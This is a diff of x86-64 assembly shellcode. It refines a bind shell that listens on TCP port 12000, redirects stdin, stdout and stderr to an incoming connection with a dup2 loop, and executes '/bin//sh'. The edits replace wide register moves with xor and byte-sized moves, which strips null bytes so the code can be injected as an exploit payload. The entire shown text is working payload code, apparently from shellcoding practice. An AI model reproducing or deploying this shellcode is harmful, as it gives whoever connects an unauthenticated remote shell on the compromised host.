@@ -19,47 +19,45 @@ _start:
   mov     byte [rsp], 0x02    ; AF_INET = 2 (word) port = 12000 (0x2ee0 big endian)  
   mov     byte [rsp+2], 0x2e  ; IP = 0 (dword)
   mov     byte [rsp+3], 0xe0  ; 0x02  0x00  0x2e  0xe0  0x00  0x00  0x00  0x00  
-  mov     rdi, r8           ; sockfd is first argument
-  mov     rsi, rsp          ; &host_addr second argument 
-  ; TODO
-  mov     rdx, 16           ; sizeof(struct sockaddr)(only first 8 matter here)
-  mov     rax, 49           ; sys_bind 64 bits
+  mov     rdi, r8             ; sockfd is first argument
+  mov     rsi, rsp            ; &host_addr second argument 
+  xor     edx, edx
+  mov     dl, 16              ; sizeof(struct sockaddr)(only first 8 matter here)
+  xor     eax, eax
+  mov     al, 49              ; sys_bind 64 bits
   syscall
 
   ; listen(sockfd, 4)
-  mov     rdi, r8           ; sockfd is first argument
-  mov     rsi,  4           ; second argument
-  mov     rax, 50           ; sys_listen 64 bits
+  mov     edi, r8d          ; sockfd is first argument
+  xor     esi, esi
+  mov     sil,  4           ; second argument
+  xor     eax, eax
+  mov     al, 50           ; sys_listen 64 bits
   syscall
 
   ; accept(sockfd, NULL, NULL) 
-  mov     rdi, r8           ; sockfd is first argument
-  xor     rsi, rsi          ; NULL second argument
-  xor     rdx, rdx          ; NULL third argument
-  mov     rax, 43           ; sys_accept 64 bits
+  mov     edi, r8d          ; sockfd is first argument
+  xor     esi, esi          ; NULL second argument
+  xor     edx, edx          ; NULL third argument
+  xor     eax, eax
+  mov     al, 43            ; sys_accept 64 bits
   syscall
-  mov     r9, rax           ; saving new socket
+  mov     r9d, eax           ; saving new socket
 
-  ; dup2(new_socketfd, 0)
-  mov     rdi, r9           ; new_socketfd first argument
-  mov     rsi, 0            ; stdin second argument
-  mov     rax, 33           ; sys_dup2 64 bits
+  ; dup2(new_socketfd, i) i = 2, 1, 0
+  xor     ebx, ebx
+  mov     bl, 2
+dup_loop:
+  mov     edi, r9d          ; new_socketfd first argument
+  mov     esi, ebx          ; stdin, stdout, stderr
+  xor     eax, eax
+  mov     al, 33            ; sys_dup2 64 bits
   syscall
-
-  ; dup2(new_socketfd, 1)
-  mov     rdi, r9           ; new_socketfd first argument
-  mov     rsi, 1            ; stdout second argument
-  mov     rax, 33           ; sys_dup2 64 bits
-  syscall
-
-  ; dup2(new_socketfd, 2)
-  mov     rdi, r9           ; new_socketfd first argument
-  mov     rsi, 2            ; stderr second argument
-  mov     rax, 33           ; sys_dup2 64 bits
-  syscall
+  dec     ebx
+  jns     dup_loop          ; sign flag not set, i.e. ebx > -1
 
   ; execve(filename, argv, envp);
-  xor   rax, rax      ; rax = 0
+  xor   eax, eax      ; rax = 0
   push  rax           ; null terminating string on the stack
   mov   rbx, 0x68732f2f6e69622f ; "/bin//sh"
   push  rbx
@@ -71,7 +69,4 @@ _start:
   mov   al, 59        ; sys_execve 64 bits (see /usr/include/asm/unistd_64.h)
   syscall             ; execve(filename, argv, envp)
   
-  
-  mov rdi, 255        ; should not reach this point
-  mov rax, 60
-  syscall
+  ; should not reach this point
